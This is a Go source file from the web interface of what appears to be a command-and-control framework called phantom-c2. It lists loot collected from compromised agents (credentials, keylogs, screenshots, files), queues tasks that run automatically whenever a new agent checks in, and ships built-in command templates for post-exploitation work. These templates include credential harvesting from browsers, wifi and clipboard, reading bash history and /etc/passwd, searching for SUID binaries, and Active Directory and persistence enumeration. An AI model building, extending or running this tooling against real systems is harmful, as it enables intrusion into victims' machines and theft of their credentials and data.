package webui

import (
	"encoding/json"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/util"
)

// ══════════════════════════════════════════
//  LOOT VIEWER
// ══════════════════════════════════════════

func (w *WebUI) handleLoot(rw http.ResponseWriter, r *http.Request) {
	agents, _ := w.server.AgentMgr.List()

	type lootItem struct {
		Agent   string `json:"agent"`
		TaskID  string `json:"task_id"`
		Type    string `json:"type"`
		Command string `json:"command"`
		Output  string `json:"output"`
		Time    string `json:"time"`
		Size    int    `json:"size"`
	}

	var loot []lootItem
	for _, a := range agents {
		tasks, _ := w.server.TaskDisp.GetTaskHistory(a.ID)
		for _, t := range tasks {
			result, _ := w.server.TaskDisp.GetResult(t.ID)
			if result == nil || len(result.Output) == 0 {
				continue
			}

			// Categorize loot by task type
			taskType := protocol.TaskTypeName(uint8(t.Type))
			lootType := ""
			switch t.Type {
			case int(protocol.TaskScreenshot):
				lootType = "screenshot"
			case int(protocol.TaskDownload):
				lootType = "file"
			case int(protocol.TaskCreds):
				lootType = "credentials"
			case int(protocol.TaskKeylog):
				lootType = "keylog"
			case int(protocol.TaskSysinfo):
				lootType = "sysinfo"
			default:
				// Only include shell output with interesting content
				output := string(result.Output)
				if len(output) < 20 {
					continue
				}
				lootType = "output"
				taskType = "shell"
			}

			output := string(result.Output)
			if len(output) > 2000 {
				output = output[:2000] + "..."
			}

			loot = append(loot, lootItem{
				Agent:   a.Name,
				TaskID:  util.ShortID(t.ID),
				Type:    lootType,
				Command: taskType + " " + strings.Join(t.Args, " "),
				Output:  output,
				Time:    util.TimeAgo(t.CreatedAt),
				Size:    len(result.Output),
			})
		}
	}
	if loot == nil {
		loot = []lootItem{}
	}
	writeJSON(rw, loot)
}

// ══════════════════════════════════════════
//  AGENT RENAME
// ══════════════════════════════════════════

func (w *WebUI) handleAgentRename(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(rw, "POST required", 405)
		return
	}
	var req struct {
		Agent   string `json:"agent"`
		NewName string `json:"new_name"`
	}
	json.NewDecoder(r.Body).Decode(&req)

	a, _ := w.server.AgentMgr.Get(req.Agent)
	if a == nil {
		writeJSON(rw, map[string]string{"error": "agent not found"})
		return
	}

	if req.NewName == "" {
		writeJSON(rw, map[string]string{"error": "new_name required"})
		return
	}

	a.Name = req.NewName
	w.server.DB.UpdateAgentName(a.ID, req.NewName)
	writeJSON(rw, map[string]string{"status": "renamed", "name": req.NewName})
}

// ══════════════════════════════════════════
//  AUTO-TASKS (run on new agent check-in)
// ══════════════════════════════════════════

var (
	autoTasks   []AutoTask
	autoTasksMu sync.RWMutex
)

type AutoTask struct {
	Command string `json:"command"`
	Args    string `json:"args"`
	Enabled bool   `json:"enabled"`
}

func init() {
	autoTasks = []AutoTask{}
}

func (w *WebUI) handleAutoTasks(rw http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		autoTasksMu.RLock()
		defer autoTasksMu.RUnlock()
		writeJSON(rw, autoTasks)
		return
	}

	var req struct {
		Action  string `json:"action"` // add, remove, list
		Command string `json:"command"`
		Args    string `json:"args"`
		Index   int    `json:"index"`
	}
	json.NewDecoder(r.Body).Decode(&req)

	autoTasksMu.Lock()
	defer autoTasksMu.Unlock()

	switch req.Action {
	case "add":
		autoTasks = append(autoTasks, AutoTask{Command: req.Command, Args: req.Args, Enabled: true})
		writeJSON(rw, map[string]string{"status": "added"})
	case "remove":
		if req.Index >= 0 && req.Index < len(autoTasks) {
			autoTasks = append(autoTasks[:req.Index], autoTasks[req.Index+1:]...)
		}
		writeJSON(rw, map[string]string{"status": "removed"})
	default:
		writeJSON(rw, map[string]string{"error": "action must be add or remove"})
	}
}

// GetAutoTasks returns current auto-tasks for use by the listener on new registrations.
func GetAutoTasks() []AutoTask {
	autoTasksMu.RLock()
	defer autoTasksMu.RUnlock()
	result := make([]AutoTask, len(autoTasks))
	copy(result, autoTasks)
	return result
}

// ══════════════════════════════════════════
//  OPERATOR AUDIT LOG
// ══════════════════════════════════════════

var (
	auditLog   []AuditEntry
	auditLogMu sync.Mutex
)

type AuditEntry struct {
	Time     string `json:"time"`
	Operator string `json:"operator"`
	Agent    string `json:"agent"`
	Action   string `json:"action"`
	Detail   string `json:"detail"`
}

func AddAuditEntry(operator, agent, action, detail string) {
	auditLogMu.Lock()
	defer auditLogMu.Unlock()
	auditLog = append(auditLog, AuditEntry{
		Time:     time.Now().Format("15:04:05"),
		Operator: operator,
		Agent:    agent,
		Action:   action,
		Detail:   detail,
	})
	// Keep last 500 entries
	if len(auditLog) > 500 {
		auditLog = auditLog[len(auditLog)-500:]
	}
}

func (w *WebUI) handleAuditLog(rw http.ResponseWriter, r *http.Request) {
	auditLogMu.Lock()
	defer auditLogMu.Unlock()
	if auditLog == nil {
		auditLog = []AuditEntry{}
	}
	writeJSON(rw, auditLog)
}

// ══════════════════════════════════════════
//  COMMAND TEMPLATES
// ══════════════════════════════════════════

var (
	cmdTemplates   []CmdTemplate
	cmdTemplatesMu sync.RWMutex
)

type CmdTemplate struct {
	Name     string   `json:"name"`
	Commands []string `json:"commands"`
	Category string   `json:"category"`
}

func init() {
	// Built-in templates
	cmdTemplates = []CmdTemplate{
		{Name: "Initial Enum", Category: "Recon", Commands: []string{"sysinfo", "shell whoami", "shell id", "shell hostname", "shell ifconfig || ipconfig /all", "ps"}},
		{Name: "Windows Enum", Category: "Recon", Commands: []string{"shell whoami /priv", "shell net user", "shell net localgroup administrators", "shell systeminfo", "shell netstat -ano"}},
		{Name: "Linux Enum", Category: "Recon", Commands: []string{"shell id", "shell uname -a", "shell cat /etc/passwd", "shell sudo -l", "shell find / -perm -4000 -type f 2>/dev/null", "shell ls -la /etc/cron*"}},
		{Name: "AD Enum", Category: "Active Directory", Commands: []string{"ad-enum-domain", "ad-enum-users", "ad-enum-groups", "ad-enum-admins", "ad-enum-spns", "ad-enum-computers"}},
		{Name: "Credential Harvest", Category: "Credential Access", Commands: []string{"creds browser", "creds wifi", "creds clipboard", "shell cat ~/.bash_history"}},
		{Name: "Persistence Check", Category: "Persistence", Commands: []string{"shell crontab -l", "shell cat /etc/crontab", "shell ls -la /etc/systemd/system/", "shell reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul"}},
	}
}

func (w *WebUI) handleCmdTemplates(rw http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		cmdTemplatesMu.RLock()
		defer cmdTemplatesMu.RUnlock()
		writeJSON(rw, cmdTemplates)
		return
	}

	var req struct {
		Action   string   `json:"action"` // add, remove
		Name     string   `json:"name"`
		Commands []string `json:"commands"`
		Category string   `json:"category"`
		Index    int      `json:"index"`
	}
	json.NewDecoder(r.Body).Decode(&req)

	cmdTemplatesMu.Lock()
	defer cmdTemplatesMu.Unlock()

	switch req.Action {
	case "add":
		cmdTemplates = append(cmdTemplates, CmdTemplate{Name: req.Name, Commands: req.Commands, Category: req.Category})
		writeJSON(rw, map[string]string{"status": "added"})
	case "remove":
		if req.Index >= 0 && req.Index < len(cmdTemplates) {
			cmdTemplates = append(cmdTemplates[:req.Index], cmdTemplates[req.Index+1:]...)
		}
		writeJSON(rw, map[string]string{"status": "removed"})
	default:
		writeJSON(rw, map[string]string{"error": "action must be add or remove"})
	}
}
